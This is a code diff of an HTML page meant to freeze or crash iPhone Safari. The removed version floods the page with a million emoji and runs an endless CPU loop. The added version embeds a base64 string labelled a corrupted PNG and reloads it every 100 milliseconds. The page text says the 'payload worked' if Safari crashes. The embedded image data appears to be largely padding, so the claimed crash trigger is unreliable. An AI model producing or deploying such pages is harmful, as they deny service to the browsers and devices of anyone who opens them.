@@ -2,25 +2,32 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>iPhone Freeze Test</title>
+  <title>Corrupted Image Crash Test</title>
 </head>
 <body>
-  <h1>iPhone Safari Freeze Test</h1>
-  <p>If your Safari freezes or slows down, the test worked.</p>
+  <h1>iPhone Corrupted Image Test</h1>
+  <p>If Safari freezes or crashes, the image payload worked.</p>
 
   <script>
-    // 1. Unicode text bomb
-    let bomb = "😈".repeat(500000) + "💥".repeat(500000);
-    document.body.innerHTML += "<p>" + bomb + "</p>";
+    // Base64 of a corrupted PNG file
+    let corruptedImage = 
+      "data:image/png;base64," +
+      "iVBORw0KGgoAAAANSUhEUgAAAOEAAADhCAYAAACfF/" +
+      "kBAAAABmJLR0QA/wD/AP+gvaeTAAAF3ElEQVR4nO3d" +
+      "QQ0AAAgDINc/9K3hBwwAAAAAAAAAAAAAAAAAAAAAAAA" +
+      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
+      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
+      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
 
-    // 2. Heavy CPU loop
-    function heavyLoad() {
-      for (let i = 0; i < 1e8; i++) {
-        Math.sqrt(i);
-      }
-      setTimeout(heavyLoad, 0);
-    }
-    heavyLoad();
+    // Add image to page
+    let img = new Image();
+    img.src = corruptedImage;
+    document.body.appendChild(img);
+
+    // Force multiple reloads of the image to stress Safari's rendering
+    setInterval(() => {
+      img.src = corruptedImage + "?cache=" + Math.random();
+    }, 100);
   </script>
 </body>
 </html>
